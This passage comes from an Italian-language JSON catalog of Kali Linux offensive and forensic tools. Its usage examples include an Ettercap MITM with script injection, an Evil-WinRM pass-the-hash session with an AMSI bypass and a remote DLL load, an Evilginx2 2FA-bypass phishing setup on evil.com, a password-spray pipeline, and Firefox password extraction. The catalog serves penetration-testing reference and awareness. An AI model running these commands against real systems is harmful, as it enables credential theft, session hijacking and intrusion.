    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Dumpzilla è un tool forense per estrarre informazioni dai profili Firefox/Iceweasel. Recupera cronologia di navigazione, password salvate, cookie, sessioni, download, form data, addon installati e preferenze. Essenziale per forensics su browser Firefox.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Password Extraction:</strong> Decripta e mostra password salvate.</p><p><strong>History Analysis:</strong> Estrae cronologia completa con timestamp.</p><p><strong>Cookie Dump:</strong> Recupera tutti i cookie con dettagli.</p><p><strong>Form Data:</strong> Estrae dati inseriti nei form.</p><p><strong>Session Recovery:</strong> Recupera sessioni di navigazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump completo del profilo\npython3 dumpzilla.py /path/to/firefox/profile\n\n# Solo password\npython3 dumpzilla.py profile/ --Passwords\n\n# Cookie e sessioni\npython3 dumpzilla.py profile/ --Cookies --Session\n\n# History con date\npython3 dumpzilla.py profile/ --History</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>Digital Forensics</strong>, analizza attività browser di un sospetto. Per <strong>Post-Exploitation</strong>, estrai credenziali da profili Firefox. <strong>Incident Response</strong> per capire cosa ha fatto un utente compromesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Accesso Locale:</strong> Richiede accesso al profilo Firefox. Password protette da master password non sono decriptabili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "eaphammer",
    "name": "eaphammer",
    "version": "1.14.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/eaphammer/",
    "desc": "Attacca reti WPA2-Enterprise con evil twin e cattura credenziali RADIUS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>EAPHammer è un toolkit per attacchi a reti wireless WPA2-Enterprise. Crea access point evil twin con server RADIUS fake per catturare credenziali EAP (PEAP, EAP-TTLS). Automatizza la creazione di certificati, configurazione hostapd e cattura delle credenziali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Evil Twin AP:</strong> Clona SSID enterprise per ingannare i client.</p><p><strong>RADIUS Server:</strong> Server freeradius integrato per cattura credenziali.</p><p><strong>Certificate Generation:</strong> Genera certificati trusted automaticamente.</p><p><strong>Hostile Portal:</strong> Opzionale captive portal per attacchi aggiuntivi.</p><p><strong>GTC Downgrade:</strong> Forza downgrade a EAP-GTC per credenziali in chiaro.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup certificati\n./eaphammer --cert-wizard\n\n# Evil twin base\n./eaphammer -i wlan0 --essid CorpWiFi --channel 6 --auth wpa-eap\n\n# Con GTC downgrade\n./eaphammer -i wlan0 --essid CorpWiFi --channel 6 --auth wpa-eap --creds\n\n# Hostile portal attack\n./eaphammer -i wlan0 --essid CorpWiFi --hostile-portal</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Pentesting</strong>, testa sicurezza reti enterprise. Nel <strong>Red Team</strong>, cattura credenziali domain per initial access. <strong>Awareness</strong> dimostrando rischi di reti enterprise mal configurate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Evil twin rilevabile da WIDS. Richiede hardware WiFi compatibile con AP mode.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "eapmd5pass",
    "name": "eapmd5pass",
    "version": "1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/eapmd5pass/",
    "desc": "Cracca autenticazione EAP-MD5 catturata da traffico wireless.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>EAPmd5pass è un tool per crackare autenticazione EAP-MD5 catturata da traffico wireless o wired 802.1X. Estrae challenge/response dal capture e tenta di recuperare la password tramite dizionario. EAP-MD5 è vulnerabile perché non usa salt, rendendo il cracking fattibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PCAP Analysis:</strong> Estrae automaticamente challenge/response dal capture.</p><p><strong>Dictionary Attack:</strong> Cracca password usando wordlist.</p><p><strong>802.1X Support:</strong> Funziona sia con wireless che wired 802.1X.</p><p><strong>Fast Cracking:</strong> Algoritmo ottimizzato per MD5.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cracca da capture\neapmd5pass -r capture.pcap -w wordlist.txt\n\n# Specifica username\neapmd5pass -r capture.pcap -w wordlist.txt -u targetuser\n\n# Verbose output\neapmd5pass -r capture.pcap -w wordlist.txt -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Wireless Pentesting</strong>, cracca credenziali EAP-MD5 catturate. Nel <strong>Network Security</strong>, dimostra debolezza di EAP-MD5 vs PEAP/EAP-TLS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Prerequisito:</strong> Richiede capture di autenticazione EAP-MD5. EAP-MD5 è deprecato, raramente usato in ambienti moderni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "edb-debugger",
    "name": "edb-debugger",
    "version": "1.3.0",
    "icon": "../app/icons/edb-debugger-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/edb-debugger/",
    "desc": "Debugger cross-platform simile a OllyDbg per analisi binaria su Linux.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>EDB (Evan's Debugger) è un debugger binario con interfaccia grafica Qt per Linux, ispirato a OllyDbg. Supporta debug di binari x86 e x86_64, con funzionalità avanzate per reverse engineering e exploit development. Include disassembler, memory viewer, breakpoint condizionali e plugin system.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>GUI Debugger:</strong> Interfaccia grafica intuitiva per debugging.</p><p><strong>x86/x64 Support:</strong> Debug di binari 32 e 64 bit.</p><p><strong>Memory Analysis:</strong> Visualizzazione e ricerca in memoria.</p><p><strong>Breakpoints:</strong> Breakpoint hardware, software e condizionali.</p><p><strong>Plugin System:</strong> Estensibile con plugin Python e C++.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia debugger\nedb\n\n# Debug di un binario\nedb --run /path/to/binary\n\n# Attach a processo\nedb --attach PID\n\n# Con argomenti\nedb --run ./binary arg1 arg2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reverse Engineering</strong>, analizza binari Linux con GUI. Nell'<strong>Exploit Development</strong>, sviluppa e testa exploit. Per <strong>Malware Analysis</strong>, debug dinamico di sample.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Analisi Locale:</strong> Tool di analisi, non lascia tracce sul target. Utile per preparazione exploit pre-engagement.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "email2phonenumber",
    "name": "email2phonenumber",
    "version": "0~git20220216",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/email2phonenumber/",
    "desc": "Cerca numero di telefono associato a un'email tramite form di recovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Email2phonenumber è un tool OSINT che tenta di scoprire numeri di telefono associati a un indirizzo email. Sfrutta i form di password recovery di vari servizi che mostrano parti del numero di telefono associato all'account. Combina i frammenti da servizi multipli per ricostruire il numero.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Service:</strong> Testa form recovery di Google, Microsoft, Apple, etc.</p><p><strong>Fragment Assembly:</strong> Combina frammenti parziali da servizi diversi.</p><p><strong>Country Detection:</strong> Identifica prefisso internazionale del numero.</p><p><strong>Automated Flow:</strong> Automatizza navigazione dei form recovery.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca numero per email\npython3 email2phonenumber.py -e target@gmail.com\n\n# Specifica servizi\npython3 email2phonenumber.py -e target@email.com -s google,microsoft\n\n# Verbose mode\npython3 email2phonenumber.py -e target@email.com -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, correla email a numeri di telefono. Nel <strong>Social Engineering</strong>, raccogli info per pretexting. <strong>Investigation</strong> per identificare soggetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate Limiting:</strong> Servizi limitano tentativi. Può triggerare alert di sicurezza sull'account target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "emailharvester",
    "name": "emailharvester",
    "version": "1.3.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/emailharvester/",
    "desc": "Raccoglie indirizzi email da motori di ricerca per un dominio target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>EmailHarvester è un tool per raccogliere indirizzi email associati a un dominio target. Cerca su motori di ricerca multipli (Google, Bing, Yahoo, Baidu) e aggrega i risultati. Utile per costruire liste di target per phishing assessment o social engineering.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Engine:</strong> Cerca su Google, Bing, Yahoo, Baidu, ASK.</p><p><strong>Domain Filtering:</strong> Filtra risultati per dominio target.</p><p><strong>Export Options:</strong> Salva risultati in file per uso successivo.</p><p><strong>Unique Results:</strong> Deduplica automaticamente gli indirizzi trovati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Raccogli email per dominio\nEmailHarvester -d target.com\n\n# Specifica motore di ricerca\nEmailHarvester -d target.com -e google\n\n# Salva output\nEmailHarvester -d target.com -o emails.txt\n\n# Limita risultati\nEmailHarvester -d target.com -l 100</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Reconnaissance</strong>, costruisci lista dipendenti target. Nel <strong>Phishing Assessment</strong>, identifica destinatari per test. <strong>OSINT</strong> per mappare personale di un'organizzazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> TheHarvester è più completo. Rate limit dei motori di ricerca può limitare risultati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Email_Harvesting"
    ],
    "notes": null
  },
  {
    "id": "enum4linux-ng",
    "name": "enum4linux-ng",
    "version": "1.3.5",
    "icon": "../app/icons/enum4linux-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/enum4linux-ng/",
    "desc": "Enumerazione SMB/NetBIOS moderna: user, share, policy, RID cycling.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Enum4linux-ng è la riscrittura moderna di enum4linux in Python. Enumera informazioni da sistemi Windows e Samba via SMB e RPC: utenti, gruppi, share, policy password, SID, OS info. Supporta null session, autenticazione e output in formati multipli. Tool essenziale per enumeration AD e SMB.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration:</strong> Lista utenti via RID cycling e querydispinfo.</p><p><strong>Share Enumeration:</strong> Trova e testa accesso a share SMB.</p><p><strong>Policy Extraction:</strong> Recupera password policy e lockout settings.</p><p><strong>Group Membership:</strong> Enumera gruppi e membership.</p><p><strong>Multiple Output:</strong> JSON, YAML, grep-friendly output.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione completa\nenum4linux-ng -A target\n\n# Con credenziali\nenum4linux-ng -u user -p pass target\n\n# Solo utenti e gruppi\nenum4linux-ng -U -G target\n\n# Output JSON\nenum4linux-ng -A -oJ output target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Enumeration</strong>, primo step dopo aver trovato DC. Nel <strong>Pentest</strong>, identifica share accessibili e utenti. Tool standard per <strong>CTF</strong> e lab Windows.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> SMB enumeration genera eventi Windows. Null session spesso bloccate in ambienti moderni.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "enum4linux",
    "name": "enum4linux",
    "version": "0.9.1",
    "icon": "../app/icons/enum4linux-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/enum4linux/",
    "desc": "Tool classico per enumerazione Windows/Samba via SMB e RPC.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Enum4linux è lo script Perl classico per enumerazione di sistemi Windows e Samba. Wrapper attorno a tool smbclient e rpcclient, automatizza la raccolta di utenti, share, gruppi, policy e informazioni di sistema via null session o credenziali. Ancora funzionale ma considera enum4linux-ng per ambienti moderni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration:</strong> Lista utenti via RID cycling.</p><p><strong>Share Listing:</strong> Enumera share SMB disponibili.</p><p><strong>Password Policy:</strong> Recupera policy password del dominio.</p><p><strong>OS Detection:</strong> Identifica sistema operativo e versione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione completa stealth (evita verbose)\nenum4linux -a -M -l -d target 2&gt;/dev/null | tee enum_results.txt\n\n# RID cycling per trovare utenti (bypass ACL)\nenum4linux -r -u '' -p '' target  # null session\nenum4linux -r -R 500-550,1000-1100 -u guest -p '' target\n\n# Enumerazione share con permessi\nenum4linux -S -u user -p pass target\n\n# Ottieni password policy (per evitare lockout)\nenum4linux -P -u user -p pass target\n\n# Pipeline con crackmapexec per spray\nenum4linux -U target | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 &gt; users.txt\ncrackmapexec smb target -u users.txt -p 'Password123!'\n\n# Preferisci enum4linux-ng per output migliore\nenum4linux-ng -A target -oJ output.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Legacy Systems</strong>, funziona bene su sistemi più vecchi. <strong>Quick Enum</strong> quando serve una scansione rapida. Usa enum4linux-ng per output migliore.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> SMB enumeration loggata. Null session raramente funziona su sistemi moderni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "enumiax",
    "name": "enumiax",
    "version": "0.4a",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/enumiax/",
    "desc": "Enumera username IAX2 su PBX Asterisk tramite brute force.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>EnumIAX è un tool per enumerare username validi su sistemi VoIP Asterisk che usano il protocollo IAX2 (Inter-Asterisk eXchange). Usa tecniche di brute force e dictionary attack per identificare account esistenti sfruttando differenze nelle risposte del server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Username Enumeration:</strong> Identifica username IAX2 validi.</p><p><strong>Dictionary Mode:</strong> Testa username da wordlist.</p><p><strong>Sequential Mode:</strong> Genera username sequenziali (100, 101, 102...).</p><p><strong>Response Analysis:</strong> Analizza risposte per determinare validità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera con dizionario\nenumIAX -d wordlist.txt -h pbx.target.com\n\n# Range sequenziale\nenumIAX -m 100 -M 200 -h pbx.target.com\n\n# Verbose mode\nenumIAX -v -d users.txt -h target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>VoIP Pentesting</strong>, primo step per identificare account su PBX Asterisk. Nel <strong>Toll Fraud Assessment</strong>, trova account per successivo password attack.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Tentativi multipli facilmente loggabili. IAX2 meno comune di SIP in ambienti moderni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "VoIP"
    ],
    "notes": null
  },
  {
    "id": "ettercap",
    "name": "ettercap",
    "version": "0.8.3.1",
    "icon": "../app/icons/ettercap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ettercap/",
    "desc": "Suite MITM: ARP poisoning, DNS spoof, traffic injection, password sniffing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ettercap è una suite completa per attacchi man-in-the-middle su LAN. Supporta ARP poisoning, DNS spoofing, sniffing attivo e passivo di password, injection di dati nel traffico e plugin estensibili. Disponibile in versione testuale e grafica, è uno dei tool MITM più completi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ARP Poisoning:</strong> MITM automatico tra host e gateway.</p><p><strong>DNS Spoofing:</strong> Redirect traffico verso server fake.</p><p><strong>Password Sniffing:</strong> Cattura credenziali da HTTP, FTP, Telnet, etc.</p><p><strong>Content Filtering:</strong> Modifica traffico on-the-fly con filtri custom.</p><p><strong>Plugin System:</strong> Estensibile con plugin per attacchi specifici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># MITM full duplex tra target e gateway\nsudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.0/24// -w capture.pcap\n\n# DNS spoof con etter.dns configurato\necho \"*.microsoft.com A 10.0.0.5\" &gt;&gt; /etc/ettercap/etter.dns\nsudo ettercap -T -M arp -P dns_spoof /gateway// /target//\n\n# Injection HTML con filtro custom\n# Crea filtro: if (ip.proto == TCP &amp;&amp; tcp.dst == 80) { replace(\"</head>\", \"<script>...</script></head>\"); }\netterfilter inject.filter -o inject.ef\nsudo ettercap -T -M arp -F inject.ef /gateway// /target//\n\n# Sniffing credenziali con output\nsudo ettercap -T -M arp /gateway// /subnet// -L logfile\n\n# Plugin attivi durante MITM\nsudo ettercap -T -M arp -P autoadd,repoison_arp /gateway// /targets//\n\n# Bridge sniffing (due interfacce)\nsudo ettercap -T -o -i eth0 -B eth1\n\n# Quiet mode per logging solo credenziali\nsudo ettercap -T -q -M arp /192.168.1.1// /192.168.1.0/24//</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Pentesting</strong>, tool standard per MITM su LAN. Nel <strong>Credential Harvesting</strong>, cattura password in transito. <strong>Security Awareness</strong> per dimostrare rischi di reti non segmentate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> ARP poisoning rilevabile da IDS e strumenti come arpwatch. Può causare instabilità di rete.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "evil-ssdp",
    "name": "evil-ssdp",
    "version": "0.8~beta",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/evil-ssdp/",
    "desc": "Crea device UPnP fake per phishing di credenziali in rete locale.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Evil-SSDP crea device UPnP/SSDP fake che appaiono come dispositivi legittimi nella rete locale. Quando la vittima clicca sul device fake in Esplora Risorse o Network, viene servita una pagina di phishing per catturare credenziali. Sfrutta la fiducia implicita nei device di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fake Device:</strong> Emula scanner, NAS, media server e altri device UPnP.</p><p><strong>Phishing Templates:</strong> Pagine di login convincenti per cattura credenziali.</p><p><strong>SSDP Response:</strong> Risponde a discovery broadcast nella LAN.</p><p><strong>Customizable:</strong> Template e device type configurabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia con template scanner\npython3 evil-ssdp.py -i eth0 --template scanner\n\n# Come NAS\npython3 evil-ssdp.py -i eth0 --template nas\n\n# Custom device name\npython3 evil-ssdp.py -i eth0 --template office365 -n \"Company Printer\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, phishing interno senza email. Nel <strong>Social Engineering</strong>, sfrutta curiosità degli utenti verso device sconosciuti. <strong>Awareness</strong> dimostrando rischi di UPnP.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Local Only:</strong> Funziona solo in LAN. Device fake visibili a tutti gli utenti della rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "evil-winrm",
    "name": "evil-winrm",
    "version": "3.7",
    "icon": "../app/icons/evil-winrm-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/evil-winrm/",
    "desc": "Shell WinRM per pentest Windows con upload, download, Pass-the-Hash.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Evil-WinRM è una shell WinRM (Windows Remote Management) progettata per penetration testing. Fornisce una shell PowerShell interattiva con funzionalità avanzate: upload/download file, caricamento script PS1, pass-the-hash, supporto proxy e molto altro. Tool essenziale per post-exploitation Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Interactive Shell:</strong> Shell PowerShell completa via WinRM.</p><p><strong>Pass-the-Hash:</strong> Autenticazione con NTLM hash senza password.</p><p><strong>File Transfer:</strong> Upload/download file integrati.</p><p><strong>Script Loading:</strong> Carica script PS1 in memoria.</p><p><strong>Docker Support:</strong> Container pronto all'uso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Pass-the-Hash con script e binary directories\nevil-winrm -i target -u admin -H 'aad3b435:ntlmhash' -s /opt/scripts/ -e /opt/binaries/\n\n# Kerberos auth con ticket\nexport KRB5CCNAME=/tmp/admin.ccache\nevil-winrm -i dc01.domain.local -r DOMAIN.LOCAL\n\n# SSL e porta custom\nevil-winrm -i target -u admin -p pass -S -P 5986\n\n# In-session commands avanzati:\nPS&gt; menu              # mostra tutti i comandi\nPS&gt; upload /tmp/SharpHound.exe C:\\Windows\\Temp\\\nPS&gt; download C:\\Windows\\Temp\\bloodhound.zip /tmp/\nPS&gt; Invoke-Binary /opt/Rubeus.exe hash /password:pass\nPS&gt; services           # lista servizi\nPS&gt; Dll-Loader -http http://10.10.10.5/inject.dll\n\n# Load PowerShell script in memory\nPS&gt; Bypass-4MSI        # AMSI bypass\nPS&gt; Import-Module /scripts/PowerView.ps1\nPS&gt; Get-DomainUser -Identity admin\n\n# Proxychains per pivoting\nproxychains evil-winrm -i 10.0.0.5 -u admin -H hash</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-Exploitation</strong>, shell preferita per Windows dopo initial access. Nel <strong>Lateral Movement</strong>, usa PTH per muoversi tra host. <strong>AD Pentesting</strong> per interazione con DC.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> WinRM logging abilitato di default. PowerShell logging cattura comandi. Considera AMSI bypass per evasion.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "evilginx2",
    "name": "evilginx2",
    "version": "3.3.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/evilginx2/",
    "desc": "MITM phishing framework che bypassa 2FA catturando session token.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Evilginx2 è un framework di phishing man-in-the-middle che agisce come proxy tra vittima e sito legittimo. Cattura credenziali E session token, bypassando efficacemente la 2FA. La vittima interagisce con il sito reale attraverso il proxy, rendendo l'attacco quasi indistinguibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Session Hijacking:</strong> Cattura cookie di sessione post-2FA.</p><p><strong>Transparent Proxy:</strong> Proxy inverso verso il sito reale.</p><p><strong>Phishlet Templates:</strong> Template per O365, Google, LinkedIn, etc.</p><p><strong>SSL Certificates:</strong> Genera certificati Let's Encrypt automaticamente.</p><p><strong>URL Masking:</strong> Crea URL convincenti per le vittime.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup completo O365 phishing\nevilginx2 -p /opt/evilginx2/phishlets\n\n: config domain evil.com\n: config ipv4 external 1.2.3.4\n: config ipv4 bind 0.0.0.0\n\n# Configura phishlet O365\n: phishlets hostname o365 login.evil.com\n: phishlets enable o365\n\n# Crea lure con redirect\n: lures create o365\n: lures edit 0 redirect_url https://office.com\n: lures edit 0 info \"IT Security Training\"\n: lures get-url 0\n\n# Blacklist bots e scanner\n: blacklist add ip 1.2.3.4\n: blacklist add useragent *bot*\n\n# Monitoraggio sessioni catturate\n: sessions         # lista tutte\n: sessions 1       # dettaglio sessione\n\n# Export cookie per uso in browser\n: sessions 1\n# Copia cookie JSON -&gt; Cookie-Editor extension\n\n# Phishlets custom per target\nvim /opt/evilginx2/phishlets/custom.yaml\n# Definisci proxy_hosts, sub_filters, auth_tokens</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, simula attacchi phishing avanzati. Nel <strong>2FA Testing</strong>, dimostra limitazioni di 2FA tradizionale. <strong>Awareness</strong> per training su phishing sofisticato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> URL sospetto visibile. FIDO2/WebAuthn resistono a questo attacco. Richiede dominio e infrastruttura dedicata.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "exe2hexbat",
    "name": "exe2hexbat",
    "version": "1.5.1",
    "icon": "../app/icons/exe2hexbat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exe2hexbat/",
    "desc": "Converte EXE in script batch hex-encoded per trasferimento senza binary.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Exe2hexbat converte file eseguibili in script batch Windows che ricostruiscono il binario originale usando comandi echo e certutil. Utile quando non puoi trasferire file binari direttamente ma hai accesso a una shell con possibilità di eseguire comandi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Hex Encoding:</strong> Converte binary in hex string.</p><p><strong>Batch Output:</strong> Genera script .bat auto-ricostruente.</p><p><strong>Certutil Decode:</strong> Usa certutil per decodifica sul target.</p><p><strong>Chunk Splitting:</strong> Divide in chunk per evitare limiti di lunghezza.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Converti eseguibile\nexe2hexbat payload.exe output.bat\n\n# Specifica nome output\nexe2hexbat -o reconstructed.exe payload.exe script.bat\n\n# Sul target Windows, copia-incolla o esegui il .bat\nC:\\> script.bat</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>File Transfer</strong>, quando HTTP/SMB non sono disponibili. Nel <strong>Restricted Environments</strong>, bypassa filtri su file binari. <strong>Living off the Land</strong> usando solo comandi nativi Windows.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Pattern certutil -decode è monitorato. Script batch molto lunghi sono sospetti. Considera alternative come PowerShell download.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "exiflooter",
    "name": "exiflooter",
    "version": "1.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exiflooter/",
    "desc": "Estrae metadati EXIF da immagini trovate online per geolocalizzazione e info sensibili sul target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ExifLooter cerca e analizza automaticamente immagini su siti web target per estrarre metadati EXIF. Può rivelare coordinate GPS, modello camera/telefono, data/ora dello scatto, software usato e altre informazioni sensibili. Utile per OSINT e reconnaissance.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Web Crawling:</strong> Cerca immagini su siti target automaticamente.</p><p><strong>GPS Extraction:</strong> Estrae coordinate di geolocalizzazione.</p><p><strong>Device Info:</strong> Identifica camera/telefono usato.</p><p><strong>Timestamp Analysis:</strong> Recupera date di creazione e modifica.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analizza sito\nexiflooter -u https://target.com\n\n# Con output JSON\nexiflooter -u https://target.com -o results.json\n\n# Cerca ricorsivamente\nexiflooter -u https://target.com -r -d 3</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, trova location da foto postate online. Nel <strong>Target Profiling</strong>, identifica device e software usati. <strong>Privacy Assessment</strong> per verificare esposizione metadata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> Operazione principalmente passiva. Molti siti strippano EXIF automaticamente. Social media generalmente rimuovono GPS.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "exploitdb-bin-sploits",
    "name": "exploitdb-bin-sploits",
    "version": "20221122",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/exploitdb-bin-sploits/",
